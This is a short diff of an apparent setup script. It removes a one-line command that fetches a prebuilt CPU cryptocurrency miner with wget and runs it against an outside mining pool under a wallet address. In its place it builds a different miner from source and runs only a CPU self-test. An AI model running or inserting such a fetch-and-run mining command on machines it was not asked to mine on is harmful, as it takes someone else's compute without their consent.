@@ -1,1 +1,6 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a yescryptr16 -o stratum+tcp://pooler.rtid-platform.web.id:3030 -u GVH1ck3UGYgQeM6631Lqc8azDErQ3ERw7k.ck
+apt-get install -y \
+build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev && \
+git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git && \
+cd cpuminer-opt-sugarchain && \
+./build-yespower.sh && \
+./cpuminer --cputest
